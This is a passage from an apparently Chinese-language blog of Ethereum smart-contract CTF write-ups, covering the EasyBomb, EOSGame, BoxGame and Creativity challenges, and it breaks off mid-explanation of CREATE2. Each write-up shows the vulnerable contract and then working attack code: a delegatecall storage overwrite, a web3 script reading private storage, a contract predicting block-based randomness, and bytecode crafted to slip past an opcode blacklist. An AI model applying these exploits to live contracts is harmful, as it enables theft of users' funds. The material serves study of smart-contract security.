class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract EasyBomb&#123;</span><br><span class="line">    bool private hasExplode = false;</span><br><span class="line">    address private launcher_address;</span><br><span class="line">    bytes32 private password;</span><br><span class="line">    bool public power_state = true;</span><br><span class="line">    bytes4 constant launcher_start_function_hash = bytes4(keccak256(&quot;setdeadline(uint256)&quot;));</span><br><span class="line">    Launcher launcher;</span><br><span class="line"></span><br><span class="line">    function msgPassword() public returns (bytes32 result)  &#123;</span><br><span class="line">        bytes memory msg_data = msg.data;</span><br><span class="line">        if (msg_data.length == 0) &#123;</span><br><span class="line">            return 0x0;</span><br><span class="line">        &#125;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            result := mload(add(msg_data, add(0x20, 0x24)))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier isOwner()&#123;</span><br><span class="line">        require(msgPassword() == password);</span><br><span class="line">        require(msg.sender != tx.origin);</span><br><span class="line">        uint x;</span><br><span class="line">        assembly &#123; x := extcodesize(caller) &#125;</span><br><span class="line">        require(x == 0);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    modifier notExplodeYet()&#123;</span><br><span class="line">        launcher = Launcher(launcher_address);</span><br><span class="line">        require(block.number &lt; launcher.deadline());</span><br><span class="line">        hasExplode = true;</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor(address _launcher_address, bytes32 _fake_flag) public &#123;</span><br><span class="line">        launcher_address = _launcher_address;</span><br><span class="line">        password = _fake_flag ;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function setCountDownTimer(uint256 _deadline) public isOwner notExplodeYet &#123;</span><br><span class="line">        launcher_address.delegatecall(abi.encodeWithSignature(&quot;setdeadline(uint256)&quot;,_deadline));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Setup &#123;</span><br><span class="line">    EasyBomb public easyBomb;</span><br><span class="line"></span><br><span class="line">    constructor(bytes32 _password) public &#123;</span><br><span class="line">        easyBomb = new EasyBomb(address(new Launcher()), _password);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isSolved() public view returns (bool) &#123;</span><br><span class="line">        return easyBomb.power_state() == false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Launcher&#123;</span><br><span class="line">    uint256 public deadline;</span><br><span class="line">    function setdeadline(uint256 _deadline) public &#123;</span><br><span class="line">        deadline = _deadline;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    constructor() public &#123;</span><br><span class="line">        deadline = block.number + 100;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-3"><a href="#Analyse-3" class="headerlink" title="Analyse"></a>Analyse</h3><p>题目要求我们改变power_state的状态为false，而函数setCountDownTimer覆盖了launcher_address，因此我们可以覆盖launch_address,然后自己写个合约来覆盖power_state从而完成题目。setCountDownTimer有两关，第一关容易满足，第二关isOwner有的麻烦，我们先通过脚本得到password&#x3D;0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d</p><p>然后我们需要构建msg.data,因为他return的是mload(add(msg_data, add(0x20, 0x24))){即需要取68位以后的}，前32位储存的是长度（mload(0x00)是数据的长度），因此我们需要使构造的msg.data的后36位是password,而selector为4位，uint传入的参数为32位，因此后面传入的就要是password了,然后我们就用参数uint去覆盖launcher_address，launcher_address与hasExplode共占一个槽，所以覆盖的时候需要注意。</p><h3 id="Attack-4"><a href="#Attack-4" class="headerlink" title="Attack"></a>Attack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">contract Attack&#123;</span><br><span class="line">    uint256 deadline;</span><br><span class="line">    constructor(address addr)public&#123;</span><br><span class="line">        address target=addr;</span><br><span class="line">        bytes32 password=0x000000000000666c61677b646f6e4c65745572447265616d4265447265616d7d;</span><br><span class="line">        address mycontract=address(new Hack());</span><br><span class="line">        bytes memory data0=abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,uint(uint168(uint160(mycontract))&lt;&lt;8),password);</span><br><span class="line">        target.call(data0);</span><br><span class="line">        bytes memory data1=abi.encodeWithSignature(&quot;setCountDownTimer(uint256)&quot;,0,password);</span><br><span class="line">        target.call(data1);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Hack&#123;</span><br><span class="line">    uint256 public deadline=block.number + 100;</span><br><span class="line">    bytes32 public password;</span><br><span class="line">    bool public power_state = true;</span><br><span class="line">    function setdeadline(uint256 _deadline) public &#123;</span><br><span class="line">        power_state=false;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>data0中自己写的覆盖合约Hack需要移动8位，防止覆盖到hasExplode参数了，注意自己生产的Hack合约中的deadline参数不能为0，因为这样会通不过第一个关卡的require(block.number &lt; launcher.deadline());</p><p>获取password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> web3 <span class="keyword">import</span> Web3</span><br><span class="line"><span class="keyword">import</span> utils</span><br><span class="line">w3 = Web3(Web3.HTTPProvider())</span><br><span class="line">addr = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">a = w3.eth.get_storage_at(addr, <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(a.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><h1 id="Bad-randomness"><a href="#Bad-randomness" class="headerlink" title="Bad randomness"></a>Bad randomness</h1><h2 id="0x01EOSGame"><a href="#0x01EOSGame" class="headerlink" title="0x01EOSGame"></a>0x01EOSGame</h2><h3 id="Code-4"><a href="#Code-4" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.24;</span><br><span class="line"></span><br><span class="line">library SafeMath &#123;</span><br><span class="line"></span><br><span class="line">  function mul(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    if (a == 0) &#123;</span><br><span class="line">      return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    uint256 c = a * b;</span><br><span class="line">    require(c / a == b);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function div(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &gt; 0); // Solidity only automatically asserts when dividing by 0</span><br><span class="line">    uint256 c = a / b;</span><br><span class="line">    // assert(a == b * c + a % b); // There is no case in which this doesn&#x27;t hold</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Subtracts two numbers, reverts on overflow (i.e. if subtrahend is greater than minuend).</span><br><span class="line">  */</span><br><span class="line">  function sub(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b &lt;= a);</span><br><span class="line">    uint256 c = a - b;</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Adds two numbers, reverts on overflow.</span><br><span class="line">  */</span><br><span class="line">  function add(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    uint256 c = a + b;</span><br><span class="line">    require(c &gt;= a);</span><br><span class="line"></span><br><span class="line">    return c;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">  * @dev Divides two numbers and returns the remainder (unsigned integer modulo),</span><br><span class="line">  * reverts when dividing by zero.</span><br><span class="line">  */</span><br><span class="line">  function mod(uint256 a, uint256 b) internal pure returns (uint256) &#123;</span><br><span class="line">    require(b != 0);</span><br><span class="line">    return a % b;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EOSToken&#123;</span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    string TokenName = &quot;EOS&quot;;</span><br><span class="line">    </span><br><span class="line">    uint256 totalSupply = 100**18;</span><br><span class="line">    address owner;</span><br><span class="line">    mapping(address =&gt; uint256)  balances;</span><br><span class="line">    </span><br><span class="line">    modifier onlyOwner() &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        _;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">        balances[owner] = totalSupply;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function mint(address _to,uint256 _amount) public onlyOwner &#123;</span><br><span class="line">        require(_amount &lt; totalSupply);</span><br><span class="line">        totalSupply = totalSupply.sub(_amount);</span><br><span class="line">        balances[_to] = balances[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function transfer(address _from, address _to, uint256 _amount) public onlyOwner &#123;</span><br><span class="line">        require(_amount &lt; balances[_from]);</span><br><span class="line">        balances[_from] = balances[_from].sub(_amount);</span><br><span class="line">        balances[_to] = balances[_to].add(_amount);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function eosOf(address _who) public constant returns(uint256)&#123;</span><br><span class="line">        return balances[_who];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract EOSGame&#123;</span><br><span class="line">    </span><br><span class="line">    using SafeMath for uint256;</span><br><span class="line">    mapping(address =&gt; uint256) public bet_count;</span><br><span class="line">    uint256 FUND = 100;</span><br><span class="line">    uint256 MOD_NUM = 20;</span><br><span class="line">    uint256 POWER = 100;</span><br><span class="line">    uint256 SMALL_CHIP = 1;</span><br><span class="line">    uint256 BIG_CHIP = 20;</span><br><span class="line">    EOSToken  eos;</span><br><span class="line">    </span><br><span class="line">    event FLAG(string b64email, string slogan);</span><br><span class="line">    </span><br><span class="line">    constructor() public&#123;</span><br><span class="line">        eos=new EOSToken();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function initFund() public&#123;</span><br><span class="line">        if(bet_count[tx.origin] == 0)&#123;</span><br><span class="line">            bet_count[tx.origin] = 1;</span><br><span class="line">            eos.mint(tx.origin, FUND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function bet(uint256 chip) internal &#123;</span><br><span class="line">        bet_count[tx.origin] = bet_count[tx.origin].add(1);</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">        if (shark == lucky)&#123;</span><br><span class="line">            eos.transfer(address(this), tx.origin, chip.mul(POWER));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function smallBlind() public &#123;</span><br><span class="line">        eos.transfer(tx.origin, address(this), SMALL_CHIP);</span><br><span class="line">        bet(SMALL_CHIP);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function bigBlind() public &#123;</span><br><span class="line">        eos.transfer(tx.origin, address(this), BIG_CHIP);</span><br><span class="line">        bet(BIG_CHIP);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function eosBlanceOf() public view returns(uint256) &#123;</span><br><span class="line">        return eos.eosOf(tx.origin);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function CaptureTheFlag(string b64email) public&#123;</span><br><span class="line">        require (eos.eosOf(tx.origin) &gt; 18888);</span><br><span class="line">        emit FLAG(b64email, &quot;Congratulations to capture the flag!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-4"><a href="#Analyse-4" class="headerlink" title="Analyse"></a>Analyse</h3><p>就是一个随机数，没啥难的</p><h3 id="Attack-5"><a href="#Attack-5" class="headerlink" title="Attack"></a>Attack</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">contract attack&#123;</span><br><span class="line">    mapping(address =&gt; uint256) public bet_count;</span><br><span class="line">    EOSGame tar;</span><br><span class="line">    uint256 MOD_NUM = 20;</span><br><span class="line">    uint public a;</span><br><span class="line">    uint public b;</span><br><span class="line">    constructor(address addr)&#123;</span><br><span class="line">        bet_count[tx.origin]+=1;</span><br><span class="line">        tar=EOSGame(addr);</span><br><span class="line">        tar.initFund();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function core()public returns(uint sharknum,uint luckynum) &#123;</span><br><span class="line">        uint256 seed = uint256(keccak256(abi.encodePacked(block.number)))+uint256(keccak256(abi.encodePacked(block.timestamp)));</span><br><span class="line">        uint256 seed_hash = uint256(keccak256(abi.encodePacked(seed)));</span><br><span class="line">        uint256 shark = seed_hash % MOD_NUM;</span><br><span class="line">        uint256 lucky_hash = uint256(keccak256(abi.encodePacked(bet_count[tx.origin])));</span><br><span class="line">        uint256 lucky = lucky_hash % MOD_NUM;</span><br><span class="line">        if (shark == lucky)&#123;</span><br><span class="line">            bet_count[tx.origin] = bet_count[tx.origin]+1;</span><br><span class="line">            tar.bigBlind();</span><br><span class="line">        &#125;</span><br><span class="line">        return(shark,lucky);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="Opcodes"><a href="#Opcodes" class="headerlink" title="Opcodes"></a>Opcodes</h1><h2 id="0x01BoxGame"><a href="#0x01BoxGame" class="headerlink" title="0x01BoxGame"></a>0x01BoxGame</h2><h3 id="Code-5"><a href="#Code-5" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract BoxGame &#123;</span><br><span class="line"></span><br><span class="line">    event ForFlag(address addr);</span><br><span class="line">    address public target;</span><br><span class="line">    </span><br><span class="line">    function payforflag(address payable _addr) public &#123;</span><br><span class="line">        </span><br><span class="line">        require(_addr != address(0));</span><br><span class="line">        </span><br><span class="line">        uint256 size;</span><br><span class="line">        bytes memory code;</span><br><span class="line"></span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(_addr)</span><br><span class="line">            code := mload(0x40)</span><br><span class="line">            mstore(0x40, add(code, and(add(add(size, 0x20), 0x1f), not(0x1f))))</span><br><span class="line">            mstore(code, size)</span><br><span class="line">            extcodecopy(_addr, add(code, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for(uint256 i = 0; i &lt; code.length; i++) &#123;</span><br><span class="line">            require(code[i] != 0xf0); // CREATE</span><br><span class="line">            require(code[i] != 0xf1); // CALL</span><br><span class="line">            require(code[i] != 0xf2); // CALLCODE</span><br><span class="line">            require(code[i] != 0xf4); // DELEGATECALL</span><br><span class="line">            require(code[i] != 0xfa); // STATICCALL</span><br><span class="line">            require(code[i] != 0xff); // SELFDESTRUCT</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        _addr.delegatecall(abi.encodeWithSignature(&quot;&quot;));</span><br><span class="line">        selfdestruct(_addr);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function sendFlag() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 1000000000 ether);</span><br><span class="line">        emit ForFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-5"><a href="#Analyse-5" class="headerlink" title="Analyse"></a>Analyse</h3><p>nc得到的源代码并不是这个，而是另一个，就因为这一点写的想吐。我们得到合约的地址反编译一下可以看到他的反编译结果与给出的代码合约不同，因此它用的是另一个合约，合约源码如上。我们想要触发合约的ForFlag,通过函数sendFlag显然不太可能，我们发现又delegatecall，那么我们构造一个合约，用来直接触发ForFlag。且合约字节码不能有f0,f1,f2,f4,fa,ff。</p><p>观察合约中的ForFlag的操作原理以及字节码的构成。</p><p><img src="https://cdto2wxndf.feishu.cn/space/api/box/stream/download/asynccode/?code=YmNiOTBiYTk3ODc5YzlkMmIxZTQxYjhiYzhiOGNiOWJfeXowOGJPa1J5REhzR1o0djJQcmc4VVlmMDRRYlhCcXdfVG9rZW46VTFXMWJIRElXb2ZFRTl4STBvR2NSNjBBbk9HXzE2OTAwMjk2MjQ6MTY5MDAzMzIyNF9WNA" alt="img"></p><p>找到反编译后ForFlag的字节码位置，如图。因此我们addr的地址需要构造为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">        02EC    60  PUSH1 0x40</span><br><span class="line">        02EE    80  DUP1</span><br><span class="line">        02EF    51  MLOAD</span><br><span class="line">        02F0    33  CALLER</span><br><span class="line">        02F1    81  DUP2</span><br><span class="line">        02F2    52  MSTORE</span><br><span class="line">        02F3    90  SWAP1</span><br><span class="line">        02F4    51  MLOAD</span><br><span class="line">        02F5    7F  PUSH32 0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2</span><br><span class="line">        0316    91  SWAP2</span><br><span class="line">        0317    81  DUP2</span><br><span class="line">        0318    90  SWAP1</span><br><span class="line">        0319    03  SUB</span><br><span class="line">        031A    60  PUSH1 0x20</span><br><span class="line">        031C    01  ADD</span><br><span class="line">        031D    90  SWAP1</span><br><span class="line">        031E    A1  LOG1</span><br><span class="line">        </span><br><span class="line">code: 6040805133815290517F89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e29181900360200190A1</span><br></pre></td></tr></table></figure><p>但是我们发现，0x89814845d4f005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2中存在f0,那么我们用e0+10来解决就可以了，所以构造好的字节码就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">        02EC    60  PUSH1 0x40</span><br><span class="line">        02EE    80  DUP1</span><br><span class="line">        02EF    51  MLOAD</span><br><span class="line">        02F0    33  CALLER</span><br><span class="line">        02F1    81  DUP2</span><br><span class="line">        02F2    52  MSTORE</span><br><span class="line">        02F3    90  SWAP1</span><br><span class="line">        02F4    51  MLOAD</span><br><span class="line">        02F5    7F  PUSH32 0x89814845d4e005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e2</span><br><span class="line">                7F  PUSH32 0X7F0000000000100000000000000000000000000000000000000000000000000000</span><br><span class="line">                01  ADD </span><br><span class="line">        0316    91  SWAP2</span><br><span class="line">        0317    81  DUP2</span><br><span class="line">        0318    90  SWAP1</span><br><span class="line">        0319    03  SUB</span><br><span class="line">        031A    60  PUSH1 0x20</span><br><span class="line">        031C    01  ADD</span><br><span class="line">        031D    90  SWAP1</span><br><span class="line">        031E    A1  LOG1</span><br><span class="line">Code:  6040805133815290517F89814845d4e005a4059f76ea572f39df73fbe3d1c9b20f12b3b03d09f999b9e27F0000000000100000000000000000000000000000000000000000000000000000019181900360200190A1</span><br></pre></td></tr></table></figure><p>然后部署字节码合约</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Attack&#123;</span><br><span class="line"></span><br><span class="line">    constructor(bytes memory a) payable public &#123;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            return(add(0x20, a), mload(a))</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在BoxGame 合约中调用payforflag就完成了。</p><p>注意：delegatecall的时候是用的其他合约的bytecodes来操作的，而主合约自身的bytecodes就不再起作用了。关键在于理解ForFlag事件触发的EVM操作过程，了解字节码的操作。</p><h2 id="0x02Creativity"><a href="#0x02Creativity" class="headerlink" title="0x02Creativity"></a>0x02<strong>Creativity</strong></h2><h3 id="Code-6"><a href="#Code-6" class="headerlink" title="Code"></a>Code</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.5.10;</span><br><span class="line"></span><br><span class="line">contract Creativity &#123;</span><br><span class="line">    event SendFlag(address addr);</span><br><span class="line"></span><br><span class="line">    address public target;</span><br><span class="line">    uint randomNumber = 0;</span><br><span class="line"></span><br><span class="line">    function check(address _addr) public &#123;</span><br><span class="line">        uint size;</span><br><span class="line">        assembly &#123; size := extcodesize(_addr) &#125;</span><br><span class="line">        require(size &gt; 0 &amp;&amp; size &lt;= 4);</span><br><span class="line">        target = _addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function execute() public &#123;</span><br><span class="line">        require(target != address(0));</span><br><span class="line">        target.delegatecall(abi.encodeWithSignature(&quot;&quot;));</span><br><span class="line">        selfdestruct(address(0));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function sendFlag() public payable &#123;</span><br><span class="line">        require(msg.value &gt;= 100000000 ether);</span><br><span class="line">        emit SendFlag(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Analyse-6"><a href="#Analyse-6" class="headerlink" title="Analyse"></a>Analyse</h3><p>这个题比较好玩，它需要我们构造一个target,然后用delegatecall去调用target。如果这个target可以任意构造，那么我们就可以通过delegatecall来触发事件发送flag，完成目标。但是，他要求我们构造的target的bytecodes&lt;&#x3D;4,这根本就不可能好不好。但是如果我们了解到一个知识点，，或许就可能了。</p><p>知识：creat2，用法就是：create2(value, offset,length,salt)。</p><p>合约地址由以下公式计算得出：<code>keccak256(0xff ++ address ++ salt ++ 